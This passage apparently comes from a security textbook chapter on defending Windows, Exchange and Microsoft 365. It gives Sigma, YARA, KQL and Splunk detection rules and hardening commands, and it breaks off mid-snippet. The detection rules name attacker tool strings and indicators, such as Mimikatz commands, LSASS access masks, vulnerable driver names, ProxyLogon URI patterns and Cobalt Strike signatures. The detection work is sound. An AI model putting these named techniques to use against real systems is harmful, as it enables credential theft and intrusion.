grep -E "2026-01-1[5-9]" timeline.csv > compromise_window.csv
```

**Phase 4 — Remediation.** After analysis is complete, remediate root causes: patch exploited vulnerabilities (Exchange CUs, Windows patches), reset all compromised credentials (including Kerberos keys — see Domain 14A for krbtgt rotation), remove attacker persistence (transport agents, mailbox rules, scheduled tasks, WMI subscriptions, registry run keys, SQL Agent jobs), and harden the environment using the controls in §8.

---

## 7. Detection Engineering — Windows and Exchange

### 7.1 Sigma rules

Sigma is the open standard for SIEM-agnostic detection rules. The following rules target the attack techniques documented throughout this chapter. Each rule is complete and can be compiled to platform-specific query languages (Splunk SPL, Microsoft Sentinel KQL, Elastic EQL, etc.) using `sigma-cli` or `pySigma`.

**Rule 1 — LSASS memory access for credential dumping.**

```yaml
title: LSASS Process Access — Credential Dumping
id: b4e5a0e1-7d3f-4a2c-9b8e-1f6d3c5a2e4b
status: stable
description: >
    Detects processes opening a handle to LSASS with access rights that permit
    memory reading (PROCESS_VM_READ, PROCESS_QUERY_INFORMATION). This is the
    primary indicator for Mimikatz, nanodump, HandleKatz, and comsvcs.dll
    MiniDump (§3.2 Methods 1-8).
references:
    - https://attack.mitre.org/techniques/T1003/001/
author: Detection Engineering
date: 2026/01/15
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    product: windows
    category: process_access
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|contains:
            - '0x1FFFFF'
            - '0x1010'
            - '0x143a'
            - '0x01410'
            - '0x1438'
            - '0x1418'
    filter_os_native:
        SourceImage|endswith:
            - '\csrss.exe'
            - '\svchost.exe'
            - '\MsMpEng.exe'
            - '\WerFault.exe'
            - '\wininit.exe'
            - '\lsm.exe'
    condition: selection and not filter_os_native
level: critical
falsepositives:
    - Legitimate security software performing memory scanning
    - Endpoint protection platforms with process inspection capability
```

**Rule 2 — Token impersonation via named pipe.**

```yaml
title: Token Impersonation via Named Pipe Creation by Service Account
id: c7f2b1d8-3e5a-4c9f-a6b2-8d1e4f7c3a9e
status: experimental
description: >
    Detects SeImpersonatePrivilege abuse where a service account (IIS, SQL)
    creates a named pipe and subsequently a SYSTEM-level child process spawns.
    Covers Potato family attacks (§2.2.3) and generic pipe-based impersonation.
references:
    - https://attack.mitre.org/techniques/T1134/001/
author: Detection Engineering
date: 2026/01/15
tags:
    - attack.privilege_escalation
    - attack.t1134.001
logsource:
    product: windows
    category: pipe_created
detection:
    selection_pipe:
        EventType: CreatePipe
        PipeName|contains:
            - '\pipe\spoolss'
            - '\pipe\efsrpc'
            - '\pipe\lsarpc'
            - '\pipe\samr'
            - '\pipe\netlogon'
    filter_system_normal:
        Image|endswith:
            - '\spoolsv.exe'
            - '\lsass.exe'
            - '\svchost.exe'
    condition: selection_pipe and not filter_system_normal
level: high
falsepositives:
    - Legitimate print spooler operations from authorized print servers
```

**Rule 3 — Potato attack — service account child process as SYSTEM.**

```yaml
title: Potato Privilege Escalation — Service Account Spawns SYSTEM Process
id: d5a3c2e9-4f6b-5d0a-b7c3-9e2f5a8d1b6c
status: stable
description: >
    Detects the result of Potato-family attacks where IIS (w3wp.exe),
    SQL Server (sqlservr.exe), or WinRM (wsmprovhost.exe) spawns a child
    process running as NT AUTHORITY\SYSTEM. See §2.2.3 for Potato mechanics.
references:
    - https://attack.mitre.org/techniques/T1134/001/
author: Detection Engineering
date: 2026/01/15
tags:
    - attack.privilege_escalation
    - attack.t1134.001
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        ParentImage|endswith:
            - '\w3wp.exe'
            - '\sqlservr.exe'
            - '\wsmprovhost.exe'
            - '\tomcat*.exe'
        User|contains: 'SYSTEM'
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\whoami.exe'
            - '\net.exe'
            - '\net1.exe'
    condition: selection
level: critical
falsepositives:
    - Legitimate maintenance scripts executed by service accounts as SYSTEM (rare)
```

**Rule 4 — DSE bypass — loading of known vulnerable drivers (BYOVD).**

```yaml
title: Known Vulnerable Driver Load — BYOVD DSE Bypass
id: e6b4d3f0-5a7c-6e1b-c8d4-0f3a6b9e2c7d
status: stable
description: >
    Detects loading of drivers known to be exploitable for kernel read/write
    primitives (RTCore64.sys, dbutil_2_3.sys, ene.sys, etc.) used to disable
    Driver Signature Enforcement or deploy unsigned rootkits. See §1.4.
references:
    - https://attack.mitre.org/techniques/T1068/
    - https://www.loldrivers.io/
author: Detection Engineering
date: 2026/01/15
tags:
    - attack.privilege_escalation
    - attack.t1068
    - attack.defense_evasion
    - attack.t1562.001
logsource:
    product: windows
    category: driver_load
detection:
    selection_by_name:
        ImageLoaded|endswith:
            - '\RTCore64.sys'
            - '\RTCore32.sys'
            - '\dbutil_2_3.sys'
            - '\ene.sys'
            - '\gdrv.sys'
            - '\AsIO.sys'
            - '\hw.sys'
            - '\WinRing0x64.sys'
            - '\phymemx64.sys'
            - '\iqvw64e.sys'
    selection_by_hash:
        Hashes|contains:
            - '01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0'
            - '0296e2ce999e67c76352613a718e11516fe1b0efc'
    condition: selection_by_name or selection_by_hash
level: critical
falsepositives:
    - Legitimate use of hardware monitoring tools (MSI Afterburner, HWiNFO)
```

**Rule 5 — SQL Server xp_cmdshell activation and execution.**

```yaml
title: SQL Server xp_cmdshell Enabled or Executed
id: f7c5e4a1-6b8d-7f2c-d9e5-1a4b7c0f3d8e
status: stable
description: >
    Detects xp_cmdshell being enabled via sp_configure or executed, indicating
    SQL Server command execution abuse. See §4.2 for exploitation techniques.
references:
    - https://attack.mitre.org/techniques/T1059/001/
author: Detection Engineering
date: 2026/01/15
tags:
    - attack.execution
    - attack.t1059.001
    - attack.persistence
    - attack.t1505.001
logsource:
    product: windows
    category: process_creation
detection:
    selection_child_of_sql:
        ParentImage|endswith: '\sqlservr.exe'
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\whoami.exe'
            - '\net.exe'
            - '\net1.exe'
            - '\certutil.exe'
            - '\bitsadmin.exe'
    condition: selection_child_of_sql
level: critical
falsepositives:
    - SQL Server maintenance procedures that legitimately invoke OS commands
```

**Rule 6 — Exchange ProxyLogon/ProxyShell HTTP patterns.**

```yaml
title: Exchange ProxyLogon or ProxyShell Exploitation Attempt
id: a8d6f5b2-7c9e-8a3d-e0f6-2b5c8d1a4e9f
status: stable
description: >
    Detects HTTP requests matching ProxyLogon (CVE-2021-26855) and ProxyShell
    (CVE-2021-34473) exploitation patterns in IIS/Exchange logs. See §5.1.1
    and §5.1.2 for full attack chains.
references:
    - https://attack.mitre.org/techniques/T1190/
    - https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/
author: Detection Engineering
date: 2026/01/15
tags:
    - attack.initial_access
    - attack.t1190
logsource:
    product: windows
    service: iis
detection:
    selection_proxylogon:
        cs-uri-stem|contains:
            - '/ecp/DDI/DDIService.svc/SetObject'
            - 'proxyLogon.ecp'
        cs-cookie|contains: 'X-BEResource='
    selection_proxyshell:
        cs-uri-stem|contains:
            - '/autodiscover/autodiscover.json'
        cs-uri-query|contains:
            - 'mapi/nspi'
            - 'mapi/emsmdb'
            - '/powershell'
    selection_webshell:
        cs-method: POST
        cs-uri-stem|contains:
            - '/aspnet_client/'
            - '/owa/auth/'
        cs-uri-stem|endswith: '.aspx'
    condition: selection_proxylogon or selection_proxyshell or selection_webshell
level: critical
falsepositives:
    - Legitimate Autodiscover requests (filtered by anomalous query parameters)
```

**Rule 7 — OAuth consent grant phishing.**

```yaml
title: Suspicious OAuth Application Consent Grant
id: b9e7a6c3-8d0f-9b4e-f1a7-3c6d9e2b5f0a
status: experimental
description: >
    Detects consent grants to OAuth applications from non-Microsoft publishers
    requesting high-privilege permissions (Mail.Read, Files.ReadWrite, etc.).
    See §5.2.1 for the complete OAuth consent grant attack flow.
references:
    - https://attack.mitre.org/techniques/T1550/001/
author: Detection Engineering
date: 2026/01/15
tags:
    - attack.credential_access
    - attack.t1550.001
logsource:
    product: azure
    service: auditlogs
detection:
    selection:
        OperationName: 'Consent to application'
    filter_microsoft:
        TargetResources.modifiedProperties.displayName|contains: 'Microsoft'
    condition: selection and not filter_microsoft
level: high
falsepositives:
    - Legitimate third-party application onboarding by IT administrators
```

**Rule 8 — Device code phishing flow anomalies.**

```yaml
title: Device Code Authentication from Untrusted Application
id: c0f8b7d4-9e1a-0c5f-a2b8-4d7e0f3c6a1b
status: experimental
description: >
    Detects device code authentication (grant_type=device_code) from applications
    not on the trusted whitelist. See §5.2.2 for device code phishing mechanics.
references:
    - https://attack.mitre.org/techniques/T1528/
author: Detection Engineering
date: 2026/01/15
tags:
    - attack.credential_access
    - attack.t1528
logsource:
    product: azure
    service: signinlogs
detection:
    selection:
        AuthenticationProtocol: 'deviceCode'
    filter_trusted:
        AppDisplayName:
            - 'Microsoft Intune'
            - 'Azure CLI'
            - 'Azure PowerShell'
            - 'Microsoft Teams'
    condition: selection and not filter_trusted
level: high
falsepositives:
    - IoT and kiosk devices using legitimate device code flow
```

**Rule 9 — PRT extraction via BrowserCore.exe and CloudAP.**

```yaml
title: Primary Refresh Token Extraction Attempt
id: d1a9c8e5-0f2b-1d6a-b3c9-5e8f1a4d7b2c
status: experimental
description: >
    Detects access to BrowserCore.exe or CloudAP related operations that
    indicate PRT extraction from an Azure AD joined device. See §5.2.3.
references:
    - https://attack.mitre.org/techniques/T1528/
author: Detection Engineering
date: 2026/01/15
tags:
    - attack.credential_access
    - attack.t1528
logsource:
    product: windows
    category: process_creation
detection:
    selection_browsercore:
        Image|endswith: '\BrowserCore.exe'
        ParentImage|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\python.exe'
            - '\python3.exe'
    selection_cloudap_mimikatz:
        CommandLine|contains:
            - 'sekurlsa::cloudap'
            - 'token::cloudap'
            - 'dpapi::cloudapkd'
    condition: selection_browsercore or selection_cloudap_mimikatz
level: critical
falsepositives:
    - BrowserCore.exe invoked by legitimate browser SSO operations (filter by parent)
```

**Rule 10 — PowerShell remoting lateral movement.**

```yaml
title: PowerShell Remoting Lateral Movement — Enter-PSSession or Invoke-Command
id: e2b0d9f6-1a3c-2e7b-c4d0-6f9a2b5e8c3d
status: stable
description: >
    Detects PowerShell remoting commands used for lateral movement.
    Enter-PSSession and Invoke-Command create WinRM sessions to remote hosts.
references:
    - https://attack.mitre.org/techniques/T1021/006/
author: Detection Engineering
date: 2026/01/15
tags:
    - attack.lateral_movement
    - attack.t1021.006
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
        CommandLine|contains:
            - 'Enter-PSSession'
            - 'Invoke-Command'
            - 'New-PSSession'
            - 'wsmprovhost.exe'
    filter_sccm:
        ParentImage|endswith: '\CcmExec.exe'
    condition: selection and not filter_sccm
level: medium
falsepositives:
    - Legitimate IT administration and configuration management via WinRM
```

**Rule 11 — Exchange webshell creation on disk.**

```yaml
title: New ASPX File Created in Exchange Web Directories
id: f3c1e0a7-2b4d-3f8c-d5e1-7a0b3c6f9d4e
status: stable
description: >
    Detects creation of .aspx files in Exchange-related web directories,
    which is the post-exploitation persistence step in ProxyLogon and
    ProxyShell attack chains (§5.1.1, §5.1.2).
references:
    - https://attack.mitre.org/techniques/T1505/003/
author: Detection Engineering
date: 2026/01/15
tags:
    - attack.persistence
    - attack.t1505.003
logsource:
    product: windows
    category: file_event
detection:
    selection:
        EventType: creation
        TargetFilename|contains:
            - '\inetpub\wwwroot\aspnet_client\'
            - '\FrontEnd\HttpProxy\owa\auth\'
            - '\FrontEnd\HttpProxy\ecp\auth\'
        TargetFilename|endswith: '.aspx'
    condition: selection
level: critical
falsepositives:
    - Exchange Cumulative Update installation creating legitimate ASPX files
```

### 7.2 YARA rules

YARA rules provide file and memory signature matching for known attack tools. These rules are applied to forensic disk images, memory dumps (from §6.1), and real-time file scanning.

**Mimikatz variants.**

```yara
rule Mimikatz_Strings
{
    meta:
        description = "Detects Mimikatz and common variants (kiwi, pypykatz) via unique strings"
        author = "Detection Engineering"
        date = "2026-01-15"
        reference = "Section 3.2 — LSASS dumping methods"
        severity = "critical"

    strings:
        $s1 = "sekurlsa::logonpasswords" ascii wide
        $s2 = "sekurlsa::wdigest" ascii wide
        $s3 = "sekurlsa::kerberos" ascii wide
        $s4 = "sekurlsa::msv" ascii wide
        $s5 = "privilege::debug" ascii wide
        $s6 = "token::elevate" ascii wide
        $s7 = "lsadump::sam" ascii wide
        $s8 = "lsadump::dcsync" ascii wide
        $s9 = "kerberos::golden" ascii wide
        $s10 = "gentilkiwi" ascii wide nocase
        $s11 = "mimikatz" ascii wide nocase
        $s12 = "mimilib" ascii wide nocase

    condition:
        uint16(0) == 0x5A4D and 4 of ($s*)
}
```

**Nanodump and HandleKatz.**

```yara
rule Nanodump_HandleKatz
{
    meta:
        description = "Detects nanodump and HandleKatz LSASS dumping tools"
        author = "Detection Engineering"
        date = "2026-01-15"
        reference = "Section 3.2 — Methods 4 and 5"
        severity = "critical"

    strings:
        $nano1 = "nanodump" ascii wide nocase
        $nano2 = "--fork" ascii wide
        $nano3 = "NtOpenProcess" ascii
        $nano4 = "MiniDumpWriteDump" ascii
        $nano5 = { 4C 8B 05 ?? ?? ?? ?? 4C 89 C1 48 89 CA }  // syscall stub pattern
        $hk1 = "HandleKatz" ascii wide nocase
        $hk2 = "DuplicateHandle" ascii
        $hk3 = "NtDuplicateObject" ascii
        $hk4 = "handlekatz" ascii nocase

    condition:
        uint16(0) == 0x5A4D and (3 of ($nano*) or 3 of ($hk*))
}
```

**Malicious Exchange transport agent DLLs.**

```yara
rule Malicious_Transport_Agent
{
    meta:
        description = "Detects suspicious Exchange Transport Agent DLLs"
        author = "Detection Engineering"
        date = "2026-01-15"
        reference = "Section 5.1.5 — Transport agent backdoor"
        severity = "high"

    strings:
        $api1 = "Microsoft.Exchange.Data.Transport" ascii
        $api2 = "SmtpReceiveAgent" ascii
        $api3 = "RoutingAgent" ascii
        $api4 = "DeliveryAgent" ascii
        $sus1 = "System.Net.Sockets" ascii
        $sus2 = "TcpClient" ascii
        $sus3 = "Process.Start" ascii
        $sus4 = "WebClient" ascii
        $sus5 = "DownloadString" ascii
        $sus6 = "FromBase64String" ascii
        $sus7 = "cmd.exe" ascii wide
        $sus8 = "powershell" ascii wide nocase

    condition:
        uint16(0) == 0x5A4D and 2 of ($api*) and 2 of ($sus*)
}
```

**Cobalt Strike in Exchange worker processes.**

```yara
rule CobaltStrike_Beacon_In_Memory
{
    meta:
        description = "Detects Cobalt Strike beacon shellcode in process memory"
        author = "Detection Engineering"
        date = "2026-01-15"
        reference = "Post-exploitation via Exchange webshell"
        severity = "critical"

    strings:
        $beacon_config = { 00 01 00 01 00 02 ?? ?? 00 02 00 01 00 02 ?? ?? }
        $named_pipe = "\\\\.\\pipe\\msagent_" ascii
        $sleep_mask = { 4C 8B 53 08 45 8B 0A 45 8B 5A 04 4D 8D 52 08 }
        $http_stager = "/submit.php?" ascii
        $malleable_get = "GET /%s HTTP/1.1" ascii
        $pipe_beacon = "\\\\%s\\pipe\\" ascii

    condition:
        3 of them
}
```

### 7.3 KQL queries for Microsoft Sentinel

**OAuth app monitoring with risk correlation.**

```kql
// Correlate risky sign-ins with subsequent Exchange mailbox access
let riskyUsers = SigninLogs
| where RiskLevelDuringSignIn in ("high", "medium")
| where TimeGenerated > ago(24h)
| distinct UserPrincipalName;
OfficeActivity
| where TimeGenerated > ago(24h)
| where Operation in ("MailItemsAccessed", "SendAs", "SendOnBehalf")
| where UserId in (riskyUsers)
| project TimeGenerated, UserId, Operation, ClientIP, MailboxOwnerUPN
| sort by TimeGenerated desc
```

**New OAuth application consent with high-privilege permissions.**

```kql
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName == "Consent to application"
| mv-expand TargetResources
| extend AppId = tostring(TargetResources.id)
| extend AppName = tostring(TargetResources.displayName)
| extend ModifiedProps = TargetResources.modifiedProperties
| mv-expand ModifiedProps
| where ModifiedProps.displayName == "ConsentAction.Permissions"
| extend Permissions = tostring(ModifiedProps.newValue)
| where Permissions has_any ("Mail.Read", "Mail.ReadWrite", "Files.ReadWrite",
    "User.Read.All", "Directory.Read.All", "RoleManagement.ReadWrite.Directory")
| project TimeGenerated, InitiatedBy.user.userPrincipalName, AppName, AppId, Permissions
```

**Exchange webshell detection via process lineage.**

```kql
DeviceProcessEvents
| where TimeGenerated > ago(7d)
| where InitiatingProcessFileName =~ "w3wp.exe"
| where FileName in~ ("cmd.exe", "powershell.exe", "pwsh.exe",
    "whoami.exe", "net.exe", "net1.exe", "ipconfig.exe",
    "systeminfo.exe", "tasklist.exe", "certutil.exe")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine,
    InitiatingProcessCommandLine, AccountName
| sort by TimeGenerated desc
```

### 7.4 Splunk SPL queries

**LSASS access anomaly detection.**

```spl
index=sysmon EventCode=10 TargetImage="*\\lsass.exe"
| eval access_hex=GrantedAccess
| where access_hex IN ("0x1FFFFF", "0x1010", "0x143a", "0x01410", "0x1438")
| where NOT match(SourceImage, "(csrss|svchost|MsMpEng|WerFault|wininit|lsm)\.exe$")
| stats count by SourceImage, access_hex, Computer, _time
| sort - count
```

**SQL Server exploitation — command execution via sqlservr.exe.**

```spl
index=sysmon EventCode=1 ParentImage="*\\sqlservr.exe"
| where match(Image, "(cmd|powershell|pwsh|whoami|net|net1|certutil|bitsadmin)\.exe$")
| table _time, Computer, ParentImage, Image, CommandLine, User
| sort - _time
```

**Exchange webshell activity — IIS worker spawning shells.**

```spl
index=sysmon EventCode=1 ParentImage="*\\w3wp.exe"
| where match(Image, "(cmd|powershell|pwsh|whoami|net|certutil|cscript|wscript)\.exe$")
| stats count by Computer, Image, CommandLine, _time
| where count > 0
| sort - _time
```

**xp_cmdshell configuration change detection.**

```spl
index=mssql sourcetype="mssql:audit"
| where match(statement, "(?i)sp_configure.*xp_cmdshell|EXEC\s+xp_cmdshell")
| table _time, server_instance_name, database_name, server_principal_name, statement
| sort - _time
```

---

## 8. Windows and Exchange Hardening

### 8.1 Credential protection

**Credential Guard deployment.** Credential Guard uses VBS to isolate NTLM hashes and Kerberos keys in VTL1 (§3.3). Deployment requires UEFI Secure Boot, TPM 2.0, and Hyper-V capability. Enable with UEFI lock to prevent offline disablement.

```powershell
# GPO: Computer Configuration → Admin Templates → System → Device Guard →
#   "Turn On Virtualization Based Security" → Enabled
#   Credential Guard Configuration: "Enabled with UEFI Lock"

# Registry equivalent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v LsaCfgFlags /t REG_DWORD /d 1 /f
# LsaCfgFlags: 1 = Enabled with UEFI lock, 2 = Enabled without lock

# Verify deployment
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
    Select-Object VirtualizationBasedSecurityStatus, SecurityServicesConfigured, SecurityServicesRunning
# VirtualizationBasedSecurityStatus: 2 = Running
# SecurityServicesRunning should include 1 (Credential Guard) and 2 (HVCI)
```

**RunAsPPL with UEFI lock.** Configuring LSASS as a Protected Process Light prevents non-PPL processes from opening handles with read access. The UEFI lock variant (value 2) stores the setting in UEFI firmware, preventing an attacker with admin access from disabling it at the registry level.

```powershell
# Enable RunAsPPL with UEFI lock
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 2 /f
# Reboot required. Value 1 = enabled but removable; value 2 = UEFI-locked.

# Verify after reboot
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL
# Confirm via event log: Wininit Event ID 12 — "LSASS.exe was started as a protected process"
Get-WinEvent -FilterHashtable @{LogName='System'; ProviderName='Wininit'; Id=12}
```

**Windows LAPS (Local Administrator Password Solution).** LAPS automatically rotates local administrator passwords and stores them in Azure AD or on-premises AD. This eliminates the risk of lateral movement via shared local admin credentials.

```powershell
# Deploy Windows LAPS via GPO
# Computer Configuration → Admin Templates → LAPS →
#   "Configure password backup directory" → Enabled → Azure Active Directory (or Active Directory)
#   "Password Settings" → Enabled → Complexity: Large letters + small letters + numbers + specials,
#     Length: 20, Age: 30 days

# Verify LAPS is active
Get-LapsAADPassword -DeviceIds "<device-id>"
# On-premises:
Get-LapsADPassword -Identity "WORKSTATION01" -AsPlainText
```

**Protected Users group.** Members of the Protected Users security group cannot use NTLM, DES, or RC4 for authentication; cannot be delegated; and cannot have credentials cached on any machine other than DCs. This group is the single most effective control against credential theft for privileged accounts.

```powershell
# Add accounts to Protected Users
Add-ADGroupMember -Identity "Protected Users" -Members "admin-t0","svc-exchange"

# Verify membership
Get-ADGroupMember -Identity "Protected Users" | Select-Object Name, SamAccountName

# Effects: NTLM disabled, Kerberos ticket lifetime reduced to 4h, no delegation,
# no credential caching (DCC2). See Domain 14A for Kerberos implications.
```

**Authentication policies and silos.** Authentication policies restrict where privileged accounts can authenticate, and authentication silos bind accounts to specific hosts. This prevents a Tier 0 admin account from authenticating to a compromised Tier 2 workstation.

```powershell
# Create authentication policy
New-ADAuthenticationPolicy -Name "T0-Policy" -Enforce `
    -UserAllowedToAuthenticateFrom "O:SYG:SYD:(XA;OICI;CR;;;WD;(@USER.ad://ext/AuthenticationSilo == `"T0-Silo`"))"

# Create authentication silo
New-ADAuthenticationPolicySilo -Name "T0-Silo" -Enforce `
    -UserAuthenticationPolicy "T0-Policy" `
    -ComputerAuthenticationPolicy "T0-Policy" `
    -ServiceAuthenticationPolicy "T0-Policy"

# Assign accounts and computers to the silo
Set-ADAccountAuthenticationPolicySilo -Identity "admin-t0" -AuthenticationPolicySilo "T0-Silo"
Set-ADAccountAuthenticationPolicySilo -Identity "DC01$" -AuthenticationPolicySilo "T0-Silo"
```

### 8.2 Kernel hardening

**HVCI enforcement.** HVCI (§1.4) prevents unsigned code execution in kernel mode and blocks most BYOVD attacks when combined with the Vulnerable Driver Blocklist.

```powershell
# GPO: Computer Configuration → Admin Templates → System → Device Guard →
#   "Turn On Virtualization Based Security" → Enabled
#   Hypervisor Enforced Code Integrity: "Enabled with UEFI Lock"

# Registry equivalent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v HypervisorEnforcedCodeIntegrity /t REG_DWORD /d 1 /f

# Verify HVCI
(Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard).SecurityServicesRunning -contains 2
```

**Process Mitigation Policies.** Windows Defender Exploit Guard provides per-process mitigations (ASLR enforcement, DEP, CFG, CIG, ACG) that can be enforced via GPO or PowerShell. Critical for hardening processes that handle untrusted input (browsers, Office, Exchange IIS workers).

```powershell
# Set exploit protection for Exchange IIS worker
Set-ProcessMitigation -Name w3wp.exe -Enable DEP,ForceRelocateImages,BottomUp,HighEntropy,CFG,StrictCFG
Set-ProcessMitigation -Name w3wp.exe -Enable BlockDynamicCode,DisableExtensionPoints

# Export current mitigations for review
Get-ProcessMitigation -Name w3wp.exe

# Apply system-wide defaults
Set-ProcessMitigation -System -Enable DEP,ForceRelocateImages,BottomUp,HighEntropy
```

**Attack Surface Reduction (ASR) rules.** ASR rules block specific attack behaviors observed in commodity and targeted malware. Each rule has a GUID and can be set to Block, Audit, or Warn mode. The recommended production configuration for an enterprise with Exchange:

```powershell
# ASR rules — set all recommended rules to Block mode
$rules = @{
    "56a863a9-875e-4185-98a7-b882c64b5ce5" = "Block abuse of exploited vulnerable signed drivers"
    "7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c" = "Block Adobe Reader from creating child processes"
    "d4f940ab-401b-4efc-aadc-ad5f3c50688a" = "Block all Office applications from creating child processes"
    "9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2" = "Block credential stealing from LSASS"
    "be9ba2d9-53ea-4cdc-84e5-9b1eeee46550" = "Block executable content from email client and webmail"
    "01443614-cd74-433a-b99e-2ecdc07bfc25" = "Block executable files from running unless they meet criteria"
    "5beb7efe-fd9a-4556-801d-275e5ffc04cc" = "Block execution of potentially obfuscated scripts"
    "d3e037e1-3eb8-44c8-a917-57927947596d" = "Block JavaScript or VBScript from launching downloaded content"
    "3b576869-a4ec-4529-8536-b80a7769e899" = "Block Office applications from creating executable content"
    "75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84" = "Block Office applications from injecting code into other processes"
    "26190899-1602-49e8-8b27-eb1d0a1ce869" = "Block Office communication application from creating child processes"
    "e6db77e5-3df2-4cf1-b95a-636979351e5b" = "Block persistence through WMI event subscription"
    "b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4" = "Block untrusted and unsigned processes that run from USB"
    "92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b" = "Block Win32 API calls from Office macros"
    "c1db55ab-c21a-4637-bb3f-a12568109d35" = "Use advanced protection against ransomware"
}

foreach ($guid in $rules.Keys) {
    Add-MpPreference -AttackSurfaceReductionRules_Ids $guid -AttackSurfaceReductionRules_Actions Enabled
}

# Verify ASR configuration
Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
```

### 8.3 Exchange hardening

**Extended Protection for Authentication (EPA).** EPA binds the TLS channel to the authentication token, preventing NTLM relay attacks against Exchange services.

```powershell
# Enable EPA on all Exchange virtual directories
Get-ExchangeServer | Get-WebApplication | Set-WebConfigurationProperty `
    -Filter "system.webServer/security/authentication/windowsAuthentication/extendedProtection" `
    -Name "tokenChecking" -Value "Require"

# Exchange-specific: use the Exchange Health Checker script to verify
.\HealthChecker.ps1 -Server EXCH01
# Review the EPA status section in the output
```

**Certificate-based authentication for Exchange admin.** Disable basic authentication on all Exchange virtual directories and enforce certificate-based or modern authentication.

```powershell
# Disable basic auth on all virtual directories
Get-OwaVirtualDirectory | Set-OwaVirtualDirectory -BasicAuthentication $false
Get-EcpVirtualDirectory | Set-EcpVirtualDirectory -BasicAuthentication $false
Get-ActiveSyncVirtualDirectory | Set-ActiveSyncVirtualDirectory -BasicAuthentication $false
Get-WebServicesVirtualDirectory | Set-WebServicesVirtualDirectory -BasicAuthentication $false

# Enable modern authentication
Set-OrganizationConfig -OAuth2ClientProfileEnabled $true

# Verify
Get-OwaVirtualDirectory | Format-List Identity, BasicAuthentication, WindowsAuthentication
```

**Transport rule security.** Create transport rules that block or quarantine messages with suspicious characteristics commonly used in phishing and malware delivery.

```powershell
# Block executable attachments
New-TransportRule -Name "Block Executable Attachments" `
    -AttachmentExtensionMatchesWords @("exe","bat","cmd","ps1","vbs","js","wsf","scr","hta","dll") `
    -RejectMessageReasonText "Executable attachments are blocked by policy" `
    -RejectMessageEnhancedStatusCode "5.7.1"

# Flag external emails
New-TransportRule -Name "External Email Warning" `
    -FromScope NotInOrganization `
    -PrependSubject "[EXTERNAL] "
```

**Disable legacy protocols.** POP3, IMAP, and legacy EWS can be exploited for credential-based attacks. Disable them for all mailboxes unless explicitly required.

```powershell
# Disable legacy protocols organization-wide
Get-CASMailboxPlan | Set-CASMailboxPlan -PopEnabled $false -ImapEnabled $false
Get-CASMailbox -ResultSize Unlimited | Set-CASMailbox -PopEnabled $false -ImapEnabled $false

# Verify
Get-CASMailbox -ResultSize Unlimited | Where-Object {$_.PopEnabled -or $_.ImapEnabled} |
    Select-Object DisplayName, PopEnabled, ImapEnabled
```

### 8.4 Microsoft 365 hardening

**Conditional Access baseline.** Conditional Access policies are the primary control plane for M365 identity security. The minimum baseline for an enterprise environment:

```
Policy 1: Require MFA for all users
  Users: All users (exclude break-glass accounts)
  Cloud apps: All cloud apps
  Grant: Require multi-factor authentication

Policy 2: Block legacy authentication
  Users: All users
  Cloud apps: All cloud apps
  Conditions: Client apps → Exchange ActiveSync clients, Other clients
  Grant: Block access

Policy 3: Block Device Code flow
  Users: All users
  Cloud apps: All cloud apps
  Conditions: Authentication flows → Device code flow
  Grant: Block access

Policy 4: Require compliant device for Exchange
  Users: All users
  Cloud apps: Office 365 Exchange Online
  Grant: Require device to be marked as compliant

Policy 5: Require app protection for mobile
  Users: All users
  Cloud apps: Office 365
  Conditions: Device platforms → iOS, Android
  Grant: Require approved client app, Require app protection policy
```

**App consent workflow.** Prevent users from granting consent to OAuth applications directly, requiring admin review.

```powershell
# Azure AD → Enterprise Applications → Consent and permissions →
#   User consent settings: "Do not allow user consent"
#   Admin consent requests: Enable admin consent workflow

# PowerShell equivalent
Set-AzureADMSAuthorizationPolicy -DefaultUserRolePermissions @{
    PermissionGrantPoliciesAssigned = @()
}
```

**Privileged Identity Management (PIM).** PIM provides just-in-time access to privileged roles, reducing the attack surface of standing admin privileges.

```powershell
# Configure PIM for Global Administrator role
# Azure AD → Privileged Identity Management → Azure AD roles → Global Administrator → Settings:
#   Activation maximum duration: 1 hour
#   Require justification on activation: Yes
#   Require ticket information on activation: Yes
#   Require approval to activate: Yes
#   Approvers: Security team
#   Require MFA on activation: Yes

# Assign eligible (not active) role
Add-AzureADMSPrivilegedRoleAssignment -ProviderId "aadRoles" `
    -ResourceId "<tenant-id>" -RoleDefinitionId "<global-admin-role-id>" `
    -SubjectId "<user-object-id>" -AssignmentState "Eligible" `
    -Schedule @{Type="Once"; StartDateTime=(Get-Date); EndDateTime=(Get-Date).AddMonths(6)}
```

**Secure Score monitoring.** Microsoft Secure Score provides a continuously-updated assessment of the tenant's security posture with actionable recommendations.

```powershell
# Query Secure Score via Graph API
$token = (Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com").Token
$headers = @{ Authorization = "Bearer $token" }
